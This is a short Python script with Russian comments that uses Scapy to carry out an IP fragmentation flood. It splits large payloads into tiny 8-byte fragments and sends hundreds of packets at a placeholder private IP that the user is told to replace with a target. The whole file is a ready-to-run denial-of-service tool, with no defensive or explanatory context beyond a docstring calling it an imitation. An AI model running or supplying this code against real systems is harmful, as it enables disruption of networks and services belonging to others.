import time
import random
from scapy.all import IP, send, fragment

def ip_frag_attack(target_ip, num_packets=100, frag_size=8):
    """
    Имитация IP Fragmentation атаки
    :param target_ip: Целевой IP-адрес
    :param num_packets: Количество пакетов для отправки
    :param frag_size: Размер фрагмента (байт)
    """
    payload = b"X" * 65507  # Байтовая строка вместо текстовой

    for _ in range(num_packets):
        packet_id = random.randint(1, 65535)
        
        # Создаем базовый пакет
        base_pkt = IP(dst=target_ip, id=packet_id, flags="MF") / payload
        
        # Фрагментируем пакет
        fragments = fragment(base_pkt, fragsize=frag_size)
        
        # Отправляем фрагменты с небольшими задержками
        for i, frag in enumerate(fragments):
            # Устанавливаем флаг MF для всех фрагментов кроме последнего
            if i < len(fragments) - 1:
                frag.flags = "MF"
            else:
                frag.flags = 0
                
            send(frag, verbose=0)
            time.sleep(0.001)  # Небольшая задержка

if __name__ == "__main__":
    target_ip = "192.168.50.1"  # Замените на целевой IP
    ip_frag_attack(target_ip, num_packets=500)